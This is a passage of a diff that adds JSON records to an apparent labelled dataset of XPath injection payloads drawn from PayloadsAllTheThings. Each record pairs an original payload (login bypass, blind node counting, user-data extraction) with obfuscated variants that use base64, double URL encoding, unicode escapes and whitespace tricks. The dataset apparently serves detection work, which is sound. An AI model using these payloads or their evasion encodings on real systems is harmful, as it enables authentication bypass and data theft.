+    "source": "Generated:raw_xpath_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c94d0e8e203d04de4d1d8a57b4a1b872098f00bde458b01f46ea71bdd21a658d",
+    "original_id": "raw_xpath_00005",
+    "original_payload": "x' or 1=1 or 'x'='y",
+    "obfuscated_payload": "eCclMDlvcgkxPTElMGFvciUwYSd4Jz0neQ==",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 208070381,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00006__obf01",
+    "payload": "count%2528%252Fchild%253A%253Anode%2528%2529%2529",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bc188a19f6d14524ae2b4d742192c878a097c2e06d4abd2a0bc8485c69e6a76b",
+    "original_id": "raw_xpath_00006",
+    "original_payload": "count(/child::node())",
+    "obfuscated_payload": "count%2528%252Fchild%253A%253Anode%2528%2529%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 208167357,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00006__obf02",
+    "payload": "Y291bnQoL2NoaWxkOjpub2RlKCkp",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bc188a19f6d14524ae2b4d742192c878a097c2e06d4abd2a0bc8485c69e6a76b",
+    "original_id": "raw_xpath_00006",
+    "original_payload": "count(/child::node())",
+    "obfuscated_payload": "Y291bnQoL2NoaWxkOjpub2RlKCkp",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 208168366,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00006__obf03",
+    "payload": "count\\u0028/child:\\u003anode\\u0028\\u0029\\u0029",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bc188a19f6d14524ae2b4d742192c878a097c2e06d4abd2a0bc8485c69e6a76b",
+    "original_id": "raw_xpath_00006",
+    "original_payload": "count(/child::node())",
+    "obfuscated_payload": "count\\u0028/child:\\u003anode\\u0028\\u0029\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 208169375,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00006__obf04",
+    "payload": "count%28%2Fchild%3A:node%28%29%29",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "bc188a19f6d14524ae2b4d742192c878a097c2e06d4abd2a0bc8485c69e6a76b",
+    "original_id": "raw_xpath_00006",
+    "original_payload": "count(/child::node())",
+    "obfuscated_payload": "count%28%2Fchild%3A:node%28%29%29",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208170384,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00007__obf01",
+    "payload": "x%27%20or%20name%28%29%3D%27username%27%20or %27x%27=%27y",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "1f3dd3611fb62ae24024851b2a7c2a668da6a667e08fcf2f4a48ea35f6490180",
+    "original_id": "raw_xpath_00007",
+    "original_payload": "x' or name()='username' or 'x'='y",
+    "obfuscated_payload": "x%27%20or%20name%28%29%3D%27username%27%20or %27x%27=%27y",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208267360,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00007__obf02",
+    "payload": "eCcgb3IgbmFtZSgpPSd1c2VybmFtZScgb3IgJ3gnPSd5",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "1f3dd3611fb62ae24024851b2a7c2a668da6a667e08fcf2f4a48ea35f6490180",
+    "original_id": "raw_xpath_00007",
+    "original_payload": "x' or name()='username' or 'x'='y",
+    "obfuscated_payload": "eCcgb3IgbmFtZSgpPSd1c2VybmFtZScgb3IgJ3gnPSd5",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 208268369,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00007__obf03",
+    "payload": "x'+or%0Aname()='username'%09or%0A'x'='y",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "1f3dd3611fb62ae24024851b2a7c2a668da6a667e08fcf2f4a48ea35f6490180",
+    "original_id": "raw_xpath_00007",
+    "original_payload": "x' or name()='username' or 'x'='y",
+    "obfuscated_payload": "x'+or%0Aname()='username'%09or%0A'x'='y",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 208269378,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_xpath_00007__obf04",
+    "payload": "x%27%20or%20name%5Cu0028%29%5Cu003d%5Cu0027username%5Cu0027%20or%20%5Cu0027x%27%3D%5Cu0027y",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "1f3dd3611fb62ae24024851b2a7c2a668da6a667e08fcf2f4a48ea35f6490180",
+    "original_id": "raw_xpath_00007",
+    "original_payload": "x' or name()='username' or 'x'='y",
+    "obfuscated_payload": "x%27%20or%20name%5Cu0028%29%5Cu003d%5Cu0027username%5Cu0027%20or%20%5Cu0027x%27%3D%5Cu0027y",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode"
+    ],
+    "generation_seed": 208270387,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00008__obf01",
+    "payload": "%2527%2520and%2520count%2528%252F%252A%2529%253D1%2520and%2520%25271%2527%253D%25271",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4ffc758bd75bff92bed7b8c3cfea52f08b70c9b314773bfdf03f3067ccb7542a",
+    "original_id": "raw_xpath_00008",
+    "original_payload": "' and count(/*)=1 and '1'='1",
+    "obfuscated_payload": "%2527%2520and%2520count%2528%252F%252A%2529%253D1%2520and%2520%25271%2527%253D%25271",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 208367363,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00008__obf02",
+    "payload": "JyBhbmQgY291bnQoLyopPTEgYW5kICcxJz0nMQ",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4ffc758bd75bff92bed7b8c3cfea52f08b70c9b314773bfdf03f3067ccb7542a",
+    "original_id": "raw_xpath_00008",
+    "original_payload": "' and count(/*)=1 and '1'='1",
+    "obfuscated_payload": "JyBhbmQgY291bnQoLyopPTEgYW5kICcxJz0nMQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 208368372,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00008__obf03",
+    "payload": "'%09and%09count(/*)=1\tand%0a'1'='1",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4ffc758bd75bff92bed7b8c3cfea52f08b70c9b314773bfdf03f3067ccb7542a",
+    "original_id": "raw_xpath_00008",
+    "original_payload": "' and count(/*)=1 and '1'='1",
+    "obfuscated_payload": "'%09and%09count(/*)=1\tand%0a'1'='1",
+    "obfuscation_chain": [
+      "xpath_space_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 208369381,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_xpath_00008__obf04",
+    "payload": "%2527%252509and%2509count%2528%252F%252A%2529%253D1%25250aand%2509%25271%2527%253D%25271",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00008",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4ffc758bd75bff92bed7b8c3cfea52f08b70c9b314773bfdf03f3067ccb7542a",
+    "original_id": "raw_xpath_00008",
+    "original_payload": "' and count(/*)=1 and '1'='1",
+    "obfuscated_payload": "%2527%252509and%2509count%2528%252F%252A%2529%253D1%25250aand%2509%25271%2527%253D%25271",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 208370390,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00009__obf01",
+    "payload": "%2527%2520and%2520count%2528%252F%2540%252A%2529%253D1%2520and%2520%25271%2527%253D%25271",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "254cd2a49ceef0686e6d593fdb443d5aaff1dde97ccfe01255867a3710d24a75",
+    "original_id": "raw_xpath_00009",
+    "original_payload": "' and count(/@*)=1 and '1'='1",
+    "obfuscated_payload": "%2527%2520and%2520count%2528%252F%2540%252A%2529%253D1%2520and%2520%25271%2527%253D%25271",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 208467366,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00009__obf02",
+    "payload": "JyBhbmQgY291bnQoL0AqKT0xIGFuZCAnMSc9JzE=",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "254cd2a49ceef0686e6d593fdb443d5aaff1dde97ccfe01255867a3710d24a75",
+    "original_id": "raw_xpath_00009",
+    "original_payload": "' and count(/@*)=1 and '1'='1",
+    "obfuscated_payload": "JyBhbmQgY291bnQoL0AqKT0xIGFuZCAnMSc9JzE=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 208468375,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00009__obf03",
+    "payload": "'%09and\tcount(\\u002f@*)=1%09and%09'1'='1",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "254cd2a49ceef0686e6d593fdb443d5aaff1dde97ccfe01255867a3710d24a75",
+    "original_id": "raw_xpath_00009",
+    "original_payload": "' and count(/@*)=1 and '1'='1",
+    "obfuscated_payload": "'%09and\tcount(\\u002f@*)=1%09and%09'1'='1",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "xpath_space_variant"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 208469384,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00009__obf04",
+    "payload": "JyBhbmQgY291bnRcdTAwMjhcdTAwMmZAKlx1MDAyOVx1MDAzZDEgYW5kIFx1MDAyNzEnXHUwMDNkXHUwMDI3MQ==",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00009",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "254cd2a49ceef0686e6d593fdb443d5aaff1dde97ccfe01255867a3710d24a75",
+    "original_id": "raw_xpath_00009",
+    "original_payload": "' and count(/@*)=1 and '1'='1",
+    "obfuscated_payload": "JyBhbmQgY291bnRcdTAwMjhcdTAwMmZAKlx1MDAyOVx1MDAzZDEgYW5kIFx1MDAyNzEnXHUwMDNkXHUwMDI3MQ==",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode"
+    ],
+    "generation_seed": 208470393,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00010__obf01",
+    "payload": "'%20and%20count(%2Fcomment%28%29)%3D1%20and '1'=%271",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc632b92d10d50953fcb488bf73f35c4bcbc13aad21d7406391143809f5aa164",
+    "original_id": "raw_xpath_00010",
+    "original_payload": "' and count(/comment())=1 and '1'='1",
+    "obfuscated_payload": "'%20and%20count(%2Fcomment%28%29)%3D1%20and '1'=%271",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208567369,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00010__obf02",
+    "payload": "JyBhbmQgY291bnQoL2NvbW1lbnQoKSk9MSBhbmQgJzEnPScx",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc632b92d10d50953fcb488bf73f35c4bcbc13aad21d7406391143809f5aa164",
+    "original_id": "raw_xpath_00010",
+    "original_payload": "' and count(/comment())=1 and '1'='1",
+    "obfuscated_payload": "JyBhbmQgY291bnQoL2NvbW1lbnQoKSk9MSBhbmQgJzEnPScx",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 208568378,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00010__obf03",
+    "payload": "\\u0027\tand%09count\\u0028\\u002fcomment\\u0028))\\u003d1\tand%09\\u00271\\u0027='1",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc632b92d10d50953fcb488bf73f35c4bcbc13aad21d7406391143809f5aa164",
+    "original_id": "raw_xpath_00010",
+    "original_payload": "' and count(/comment())=1 and '1'='1",
+    "obfuscated_payload": "\\u0027\tand%09count\\u0028\\u002fcomment\\u0028))\\u003d1\tand%09\\u00271\\u0027='1",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 208569387,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00010__obf04",
+    "payload": "JyBhbmQgY291bnRcdTAwMjhcdTAwMmZjb21tZW50KClcdTAwMjk9MSBhbmQgXHUwMDI3MVx1MDAyNz0nMQ",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc632b92d10d50953fcb488bf73f35c4bcbc13aad21d7406391143809f5aa164",
+    "original_id": "raw_xpath_00010",
+    "original_payload": "' and count(/comment())=1 and '1'='1",
+    "obfuscated_payload": "JyBhbmQgY291bnRcdTAwMjhcdTAwMmZjb21tZW50KClcdTAwMjk9MSBhbmQgXHUwMDI3MVx1MDAyNz0nMQ",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 208570396,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00011__obf01",
+    "payload": "%27%29%5D%20%7C%20%2F%2Fuser%2F*[contains%28*,%27",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d14c971853397ec97f187ca586f2ad822009c4ad85b4d2df9445f306a27154b8",
+    "original_id": "raw_xpath_00011",
+    "original_payload": "')] | //user/*[contains(*,'",
+    "obfuscated_payload": "%27%29%5D%20%7C%20%2F%2Fuser%2F*[contains%28*,%27",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208667372,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00011__obf02",
+    "payload": "JyldIHwgLy91c2VyLypbY29udGFpbnMoKiwn",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d14c971853397ec97f187ca586f2ad822009c4ad85b4d2df9445f306a27154b8",
+    "original_id": "raw_xpath_00011",
+    "original_payload": "')] | //user/*[contains(*,'",
+    "obfuscated_payload": "JyldIHwgLy91c2VyLypbY29udGFpbnMoKiwn",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 208668381,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_xpath_00011__obf03",
+    "payload": "'\\u0029]%0A|%0A\\u002f\\u002fuser\\u002f*\\u005bcontains\\u0028*,'",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d14c971853397ec97f187ca586f2ad822009c4ad85b4d2df9445f306a27154b8",
+    "original_id": "raw_xpath_00011",
+    "original_payload": "')] | //user/*[contains(*,'",
+    "obfuscated_payload": "'\\u0029]%0A|%0A\\u002f\\u002fuser\\u002f*\\u005bcontains\\u0028*,'",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 208669390,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00011__obf04",
+    "payload": "')]\t|%09//u%73%65r/*[contai%6Es(*,'",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d14c971853397ec97f187ca586f2ad822009c4ad85b4d2df9445f306a27154b8",
+    "original_id": "raw_xpath_00011",
+    "original_payload": "')] | //user/*[contains(*,'",
+    "obfuscated_payload": "')]\t|%09//u%73%65r/*[contai%6Es(*,'",
+    "obfuscation_chain": [
+      "xpath_space_variant",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208670399,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00012__obf01",
+    "payload": "and%20string-length%28account%29%3DSIZE_INT",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "40497cc83ea81d7e6666efbe0cc25ce74be7a3a4bdf1bf4a5075aed9a78443f9",
+    "original_id": "raw_xpath_00012",
+    "original_payload": "and string-length(account)=SIZE_INT",
+    "obfuscated_payload": "and%20string-length%28account%29%3DSIZE_INT",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 208767375,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_xpath_00012__obf02",
+    "payload": "YW5kIHN0cmluZy1sZW5ndGgoYWNjb3VudCk9U0laRV9JTlQ=",
+    "label": 1,
+    "attack_type": "xpath",
+    "attack_subtype": "external_curated",
+    "param_location": "query",
+    "source": "Generated:raw_xpath_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/XPATH%20Injection/README.md",
+    "source_path": "XPATH Injection/README.md",
